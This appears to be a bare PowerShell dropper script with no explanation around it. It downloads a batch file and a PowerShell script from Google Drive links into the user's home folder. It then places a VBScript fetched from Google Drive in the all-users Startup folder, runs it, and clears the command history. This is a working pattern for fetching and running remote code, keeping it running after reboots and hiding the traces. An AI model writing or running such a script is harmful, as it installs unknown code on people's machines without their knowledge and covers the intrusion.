cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/file/d/1PGkL2a8blyalRTt74E_1tg0fYg7x-q8j/view?usp=sharing" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1FFNPRwKOhMnO5lDxXO3XaUhkZPp31sfP" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1ctOSIOgWU9dnYaUefB7b2jl3u9juPIC2" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
